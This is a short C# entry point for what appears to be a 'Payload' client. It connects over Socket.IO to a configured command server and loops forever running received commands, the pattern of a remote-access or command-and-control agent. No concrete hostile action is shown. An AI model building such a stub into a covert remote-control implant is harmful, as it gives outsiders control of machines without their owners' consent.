
using CommonClassLibrary;
using Payload.Command;

if (Config.IsDebug()) Console.WriteLine("Safe Lock");


var payloadSocketClient = new Payload.SocketIoClient(Config.SocketIOClientCommandServerHost);

while (true)
{
    CommandManager.Instance.Run();
    Thread.Sleep(Config.Instance.MainSleepInterval);
}